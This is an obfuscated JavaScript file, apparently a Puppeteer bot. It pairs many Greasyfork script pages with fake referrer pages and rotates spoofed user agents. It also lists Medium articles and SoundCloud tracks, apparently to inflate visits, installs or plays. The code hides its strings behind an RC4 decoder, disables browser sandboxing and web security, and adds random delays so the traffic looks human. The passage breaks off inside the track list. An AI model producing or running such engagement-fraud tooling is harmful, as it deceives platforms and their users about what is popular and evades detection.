function b(c, d) {
  const e = a();
  return b = function(f, g) {
    f = f - (-0x647 + 0x1 * -0x1d11 + 0xd * 0x2b8);
    let h = e[f];
    if (b['YLqxyL'] === undefined) {
      var i = function(n) {
        const o = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';
        let p = '',
          q = '';
        for (let r = 0x1fdf + 0x1def * 0x1 + 0x36 * -0x125, s, t, u = -0x123b * -0x1 + -0x2 * -0x2e9 + -0x180d; t = n['charAt'](u++); ~t && (s = r % (-0x3b9 + 0x1678 + 0x23 * -0x89) ? s * (0x12fe + -0xbd8 + 0x373 * -0x2) + t : t, r++ % (0x5a8 + -0x42f + -0x175 * 0x1)) ? p += String['fromCharCode'](-0x1 * 0x16f7 + -0x139 * 0x9 + -0x1 * -0x22f7 & s >> (-(-0x10be * 0x1 + 0x11bc + -0xfc) * r & -0x241b + 0x136 * 0x1f + -0x1 * 0x169)) : -0x1 * -0xb5d + -0x574 + 0x11 * -0x59) {
          t = o['indexOf'](t);
        }
        for (let v = 0x2d * 0x8b + -0x2206 + 0x997, w = p['length']; v < w; v++) {
          q += '%' + ('00' + p['charCodeAt'](v)['toString'](-0x62 * -0x4f + -0x1 * 0x1592 + -0x89c))['slice'](-(-0x15a2 + 0x1e7b + 0x8d7 * -0x1));
        }
        return decodeURIComponent(q);
      };
      const m = function(n, o) {
        let p = [],
          q = -0x3 * 0xc91 + 0x170c + 0x155 * 0xb,
          r, t = '';
        n = i(n);
        let u;
        for (u = 0x27c * 0xa + 0x25 * -0x2b + -0x12a1; u < 0x57 * 0x1d + 0xa7b * 0x2 + -0x1dd1; u++) {
          p[u] = u;
        }
        for (u = 0x1 * 0x386 + 0xff7 + -0x137d; u < 0x19f3 + 0xdbd + -0x8 * 0x4d6; u++) {
          q = (q + p[u] + o['charCodeAt'](u % o['length'])) % (0x12a1 + 0xb * -0x241 + 0x72a), r = p[u], p[u] = p[q], p[q] = r;
        }
        u = -0x15 * -0x1b1 + 0x2f7 + -0x267c, q = -0x1fb * 0x10 + 0x4d1 * 0x4 + 0xc6c;
        for (let v = -0x2 * 0x4fd + 0x36 * -0x7a + 0x7 * 0x51a; v < n['length']; v++) {
          u = (u + (0x2696 * -0x1 + -0x6f * 0x13 + 0x6f * 0x6c)) % (0x17f * 0x9 + 0x1b42 + -0x1 * 0x27b9), q = (q + p[u]) % (-0x7f8 + -0x7 * 0x143 + 0x11cd), r = p[u], p[u] = p[q], p[q] = r, t += String['fromCharCode'](n['charCodeAt'](v) ^ p[(p[u] + p[q]) % (-0x360 + 0x962 + -0x502)]);
        }
        return t;
      };
      b['QVKBYV'] = m, c = arguments, b['YLqxyL'] = !![];
    }
    const j = e[-0x1 * 0x9e0 + 0x2207 + 0x3 * -0x80d],
      k = f + j,
      l = c[k];
    return !l ? (b['jzZgEl'] === undefined && (b['jzZgEl'] = !![]), h = b['QVKBYV'](h, g), c[k] = h) : h = l, h;
  }, b(c, d);
}
const a1 = d,
  a0 = c,
  Z = b;

function d(b, c) {
  const e = a();
  return d = function(f, g) {
    f = f - (-0x647 + 0x1 * -0x1d11 + 0xd * 0x2b8);
    let h = e[f];
    return h;
  }, d(b, c);
}

function getRandomInt(f, g) {
  const h = ceil(f);
  return floor(random() * (floor(g) - h + (0x1a9d + -0x52c + -0x4 * 0x55c))) + h;
}
async function randomWait() {
  return await wait(0x35 * -0xbb + 0x1cbe + 0x1d81 + (0x3 * -0xb5f + 0x22b4 + 0x12f1) * random()), -0x23a4 + 0xc38 + 0x176d;
}
const flags = {
    'ActivateBrowser': 0x1,
    'RPL2_GF': 0x1,
    'RPL2_SC2': 0x1,
    'RPL2_MDM2': 0x1,
    'RPL2_WP': 0x0,
    'RPL2_RPRT': 0x1,
    'doOUJS': 0x1,
    'doCreateServer': 0x1,
    'doExtFingerprint': 0x1
  },
  wait = f => new Promise(g => setTimeout(g, f)),
  {
    log: log,
    warn: warn
  } = console,
  {
    floor: floor,
    random: random,
    ceil: ceil
  } = Math,
  NETWORK_PATIENCE = -0x22 * -0xf + -0x2 * 0x493 + 0x3608 + (0x11bc + 0x1733 + -0x1d37) * random(),
  MM_NETWORK_PATIENCE = (-0x241b + 0x136 * 0x1f + -0x7 * 0x34) * NETWORK_PATIENCE,
  me = random()['toString'](-0x1 * -0xb5d + -0x574 + 0x3 * -0x1f3)['substring'](0x2d * 0x8b + -0x2206 + 0x99b, -0x62 * -0x4f + -0x1 * 0x1592 + -0x8a2),
  pptOptions = {
    'headless': 0x0,
    'setDefaultNavigationTimeout': 0x0,
    'setDefaultTimeout': 0x0,
    'args': [
      '--no-sandb' + 'ox',
      '--disable-' + 'setuid-san' + 'dbox',
      '--disable-' + 'dev-shm-us' + 'age',
      '--disable-' + 'web-securi' + 'ty'
    ],
    'executablePath': '/../../../' + process['env']['PUPPETEER_' + 'EXECUTABLE' + '_PATH']
  },
  axios = require('axios'),
  fetch = require('node-fetch'),
  data = {
    'scriptTargets': [{
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/457024' + '-surviv-io' + '-xclient-b' + 'eta',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/surviv.i' + 'o'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/404065' + '-%E7%BD%91' + '%E9%A1%B5%' + 'E7%B2%BE%E' + '7%81%B5',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/51cto.co' + 'm'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/22545-' + 'anti-bd-re' + 'direct',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/baidu' + '.com?page=' + '4'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/385' + '044-zhihu-' + 'anonymous-' + 'users',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/zhihu' + '.com'
      },
      {
        'url': 'https://gr' + Z(0x0, '0hER') + 'rg/zn-CN/s' + 'cripts/302' + '36-zhihu-l' + 'ink-fix',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/zhihu' + '.com'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/435948' + '-btb',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/baidu.co' + 'm'
      },
      {
        'url': 'https://gr' + Z(0x8, 'F[HF') + 'rg/en/scri' + 'pts/430335' + '-wb-script',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/zhihu.co' + 'm'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430572' + '-beautify-' + 'the-baidu-' + 'homepage',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + Z(0x4, 'F[HF') + 'e/zhihu.co' + 'm'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/410781' + '-diep-io-a' + 'nti-afk-ti' + 'meout',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/1196-v' + 'iew-youtub' + 'e-tags',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/21012-' + 'youtubeext',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/20798-' + 'youtube-hi' + 'de-volume-' + 'control',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/9090-y' + 'outube-add' + '-video-id-' + 'text-field',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/20710-' + 'calm-down-' + 'youtube',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/39544-' + 'youtube-po' + 'lymer-disa' + 'ble',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/412698' + '-youtube-a' + 'uto-skip-a' + 'ds',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/413965' + '-youtube-l' + 'ike-dislik' + 'e-video-an' + 'd-skip-ad-' + 'keyboard-s' + 'hortcuts-f' + 'ork-from-n' + 'erevar009',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/39919-' + 'youtube-su' + 'ggested-vi' + a0(0xa) + 'for-youtub' + 'e-classic',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/414756' + '-requestho' + 'ok',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/414876' + '-live-chat' + '-mod-calib' + 'er',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/40462-' + 'youtube-no' + '-resume',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/40517-' + 'youtube-re' + 'sume',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/415706' + '-moomoo-io' + '-remove-co' + 'okie-prefe' + 'rences-tab',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405955' + '-web-secur' + 'ity',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/381682' + '-html5%E8%' + 'A7%86%E9%A' + '2%91%E6%92' + '%AD%E6%94%' + 'BE%E5%99%A' + '8%E5%A2%9E' + '%E5%BC%BA%' + 'E8%84%9A%E' + '6%9C%AC',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/429635' + '-always-on' + '-focus',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/30310-' + 'removeads',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/455853' + '-%E7%BD%91' + '%E9%A1%B5%' + 'E8%AE%BF%E' + '9%97%AE%E5' + '%8A%A0%E9%' + '80%9F%E5%9' + '9%A8',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454941' + '-hcaptcha-' + 'captcha-so' + 'lver-by-no' + 'captchaai',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/baidu.co' + 'm'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/discord.' + 'com'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/407994' + '-mope-io-a' + 'uto-dive-a' + 'uto-boost-' + 'see-people' + '-underwate' + 'r-see-invi' + 'sible-play' + 'ers-remove' + '-ads',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/mope.io'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424066' + '-pancake-m' + 'od-katana-' + 'musket-aut' + 'oheal-anti' + '-insta-sta' + 'rter-resou' + 'rces-and-m' + 'ore',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/429746' + '-best-moom' + 'oo-io-hack' + '-mod-2022-' + '2023',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405943' + '-moomoo-io' + '-agar-io-s' + 'urviv-io-s' + 'lither-io-' + 'diep-io-gl' + 'obal-name-' + 'manager-kr' + 'unker-comi' + 'ng-soon',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456855' + '-anti-anti' + '-adblock-v' + '1-all-site' + 's',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454134' + '-moomoo-io' + '-dune-mod-' + 'autoheal-a' + 'utobreak-f' + 'ast-and-mo' + 're',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424447' + '-xtaming-c' + 'lient-tami' + 'ng-io-hack' + 's',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/taming.i' + 'o'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/451547' + '-moomoo-io' + '-insane-mo' + 'd-beta-too' + '-fast-read' + '-descripti' + 'on',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424655' + '-i30cps-ut' + 'ility-mod',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + a0(0x7) + '-%E5%8A%9B' + '%E6%89%A3%' + 'E9%A2%98%E' + '7%9B%AE%E8' + '%BD%ACmark' + 'down',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/leetcode' + '.cn'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/445806' + '-moomoo-io' + '-auto-heal',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/434199' + '-moomoo-io' + '-helper-to' + '-become-pr' + 'o',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405943' + '-moomoo-io' + '-agar-io-s' + 'urviv-io-s' + 'lither-io-' + 'diep-io-gl' + 'obal-name-' + 'manager-kr' + 'unker-comi' + 'ng-soon',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/slither.' + 'io'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454409' + '-video-dow' + 'nloader-fo' + 'r-tampermo' + 'nkey',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/452314' + '-adblock-s' + 'cript-for-' + 'webview',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/35466-' + 'mouseplus',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456851' + '-omnifocus',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430253' + '-arras-io-' + 'multibox-s' + 'cript',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/arras.io'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/438879' + '-diep-io-p' + 'ermanent-l' + 'eader-arro' + 'w',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430255' + '-warinspac' + 'e-bots',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/warin.sp' + 'ace'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/444523' + '-diep-io-m' + 'inimap-hig' + 'hlights',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456856' + '-optimize-' + 'quill-org',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/quill.or' + 'g'
      }
    ],
    'userAgents': [
      'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-A205U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
      'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-A102U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
      'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-G960U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
      'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-N960U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
      'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'WOW64)\x20App' + 'leWebKit/5' + '37.36\x20(KHT' + 'ML,\x20like\x20G' + 'ecko)\x20Chro' + 'me/108.0.0' + '.0\x20Safari/' + '537.36',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0)\x20' + 'AppleWebKi' + 't/537.36\x20(' + 'KHTML,\x20lik' + 'e\x20Gecko)\x20C' + 'hrome/108.' + '0.0.0\x20Safa' + 'ri/537.36',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6\x20Edg/108.' + '0.1462.46',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6'
    ],
    'mediumArticles': [
      'https://me' + 'dium.com/',
      'https://me' + 'dium.com/@' + 'syn_52523/' + 'ethics-of-' + 'advertisin' + 'g-and-ad-b' + 'locking-a6' + '2bdde987b0',
      'https://me' + 'dium.com/@' + 'digitalgir' + 'affes/7-aw' + 'esome-and-' + 'free-ai-to' + 'ols-you-sh' + 'ould-know-' + '43a1630ea4' + '09',
      'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-commenta' + 'ry-on-the-' + 'ai-wave-21' + '5d668f827a',
      'https://me' + 'dium.com/@' + 'melih193/r' + 'eact-devel' + 'oper-roadm' + 'ap-2022-76' + 'ca119188bd',
      'https://me' + 'dium.com/e' + 'ntrepreneu' + 'r-s-handbo' + 'ok/is-your' + '-startup-a' + '-good-fit-' + 'for-ventur' + 'e-capital-' + 'bc59596df9' + 'e4',
      'https://me' + 'dium.com/@' + 'syn_52523/' + 'the-simple' + '-fundament' + 'als-of-c-e' + 'ed2fbb5792' + '9',
      'https://me' + 'dium.com/b' + 'etter-prog' + 'ramming/co' + 'de-review-' + 'chores-tha' + 't-we-shoul' + 'd-automate' + '-using-dan' + 'ger-js-6cf' + '72ff3bf98',
      'https://me' + 'dium.com/g' + 'itconnecte' + 'd/use-git-' + 'like-a-sen' + 'ior-engine' + 'er-ef6d741' + 'c898e',
      'https://me' + 'dium.com/@' + 'sudiparyal' + '185/differ' + a1(0xf) + 'en-foreach' + '-and-map-i' + 'n-javascri' + 'pt-342c50b' + '59f9',
      'https://me' + 'dium.com/@' + 'dan-perry/' + 'the-world-' + 'that-knew-' + 'too-much-e' + '9ca2372ee2' + '1',
      'https://me' + 'dium.com/b' + 'itsrc/adva' + 'nced-data-' + 'structures' + '-and-algor' + 'ithms-trie' + 's-47db931e' + '20e',
      'https://da' + 'shmacintyr' + 'e.medium.c' + 'om/a-list-' + 'of-stories' + '-donald-tr' + 'ump-paid-t' + 'o-catch-an' + 'd-kill-jus' + Z(0xd, 'zFbf') + 'e29f9f5f68' + '7',
      'https://me' + 'dium.com/@' + 'syn_52523/' + 'small-java' + 'script-opt' + 'imization-' + 'tips-1c4cb' + '387a463',
      'https://me' + 'dium.com/@' + 'michaelcos' + 'tello.swe/' + 'dbspy-4-0-' + '6989c6ea47' + 'd8',
      'https://me' + 'dium.com/@' + 'syn_52523/' + 'chatgpt-on' + '-itself-3b' + '1042b968cb',
      'https://me' + 'dium.com/@' + 'thisisjimk' + 'eller/plea' + 'se-stop-in' + 'cluding-co' + 'lor-names-' + 'in-your-cs' + 's-classes-' + 'f1090f6f2e' + '29',
      'https://me' + 'dium.com/@' + 'mattcodes0' + '6/building' + '-projects-' + 'takes-time' + '-18dfa6d6e' + '702',
      'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-rabbit-h' + 'ole-of-js-' + 'hyper-opti' + 'mization-a' + '618288174b',
      'https://me' + 'dium.com/@' + 'olopadeadu' + 'nola/the-c' + 'haos-in-ou' + 'r-twenties' + '-8fcefe061' + 'ef8',
      'https://me' + 'dium.com/@' + 'leanfolks/' + 'mobile-app' + '-architect' + 'ure-6848aa' + '1d5764',
      'https://bl' + 'og.bitsrc.' + 'io/i-asked' + '-chat-gpt-' + 'to-build-a' + '-to-do-app' + '-have-we-f' + 'inally-met' + '-our-repla' + 'cement-ad3' + '47ad74c51',
      'https://me' + 'dium.com/@' + 'alexey.ink' + 'in/never-h' + 'ave-separa' + 'te-sign-in' + '-routes-7c' + '9a6dd4dc7c',
      'https://me' + 'dium.com/@' + 'syn_52523/' + 'breaking-i' + 'nto-the-ma' + 'rket-1b665' + '2b2a05a',
      'https://me' + 'dium.com/@' + 'syn_52523/' + 'javascript' + '-series-th' + 'e-fundamen' + 'tals-1a646' + 'c357955',
      'https://me' + 'dium.com/@' + 'syn_52523/' + 'javascript' + '-series-oo' + 'p-and-cons' + 'tructors-1' + '0dc5877e98' + '5',
      'https://me' + 'dium.com/b' + 'etter-prog' + 'ramming/le' + 'gacy-code-' + 'potential-' + 'gold-mine-' + 'of-learnin' + 'g-a59fdcb1' + '4804',
      'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-commenta' + 'ry-on-the-' + 'ai-wave-ii' + '-7de427c9f' + 'd15'
    ],
    'soundcloudTracks': [
      'https://so' + 'undcloud.c' + 'om/22down/' + 'long-day-r' + 'emix-prod-' + 'unnecessar' + 'y-beats?si' + '=fa2e1d6f9' + 'b4b4901969' + 'a02c82d453' + '4c4&utm_so' + 'urce=clipb' + 'oard&utm_m' + 'edium=text' + '&utm_campa' + 'ign=social' + '_sharing',
      'https://so' + 'undcloud.c' + 'om/quadeca' + 'x8/house-s' + 'ettling-ft' + '-danny-bro' + 'wn?si=3527' + 'c3f6b1904b' + 'edac2d3673' + 'b266b9aa&u' + 'tm_source=' + 'clipboard&' + 'utm_medium' + '=text&utm_' + 'campaign=s' + 'ocial_shar' + 'ing',
      'https://so' + 'undcloud.c' + 'om/22down/' + 'worried-ab' + 'out-the-tr' + 'uth-ft-rik' + 'anbeastly-' + 'nikkkq-cas' + 'ualcheater' + '?si=2ec72b' + 'b6d77b4a08' + 'b2e8422f68' + '55699b&utm' + '_source=cl' + 'ipboard&ut' + 'm_medium=t' + 'ext&utm_ca' + 'mpaign=soc' + 'ial_sharin' + 'g',
      'https://so' + 'undcloud.c' + 'om/22down/' + 'whatnot-de' + 'mo?si=357e' + '7dfc02cc4e' + 'a28b94c66a' + 'f7050293&u' + 'tm_source=' + 'clipboard&' + 'utm_medium' + '=text&utm_' + 'campaign=s' + 'ocial_shar' + 'ing',
      'https://so' + 'undcloud.c' + 'om/quadeca' + 'x8/sisyphu' + 's?si=2646e' + 'cb7ea704ba' + '68ea2711d1' + '659e92a&ut' + 'm_source=c' + Z(0xe, '*6Ym') + 'tm_medium=' + 'text&utm_c' + 'ampaign=so' + 'cial_shari' + 'ng',
      'https://so' + 'undcloud.c' + 'om/quadeca' + 'x8/knots?s' + 'i=c127f344' + 'b3d34c9ca8' + 'e3d7cb4679' + a0(0x1) + 'ource=clip' + 'board&utm_' + 'medium=tex' + 't&utm_camp' + 'aign=socia' + 'l_sharing',
